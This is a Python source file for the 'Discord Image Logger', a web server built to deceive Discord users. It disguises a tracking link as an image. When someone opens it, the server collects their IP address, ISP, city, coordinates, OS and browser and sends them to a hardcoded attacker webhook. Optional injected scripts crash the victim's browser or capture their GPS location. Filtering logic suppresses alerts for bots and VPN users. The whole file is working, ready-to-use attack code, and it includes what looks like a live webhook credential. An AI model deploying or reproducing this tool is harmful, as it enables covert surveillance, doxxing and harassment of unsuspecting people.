# Discord Image Logger
# By Dexty | https://github.com/xdexty0

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Dexty"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1419768594513924108/FIiPLsrVD-tLYX8ASCpIm3vzUnEFwF1D_VkiYVlSirunxq78-YpDNgSYGhdmUente6SG",
    "image": "data:image/webp;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/xdexty0

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
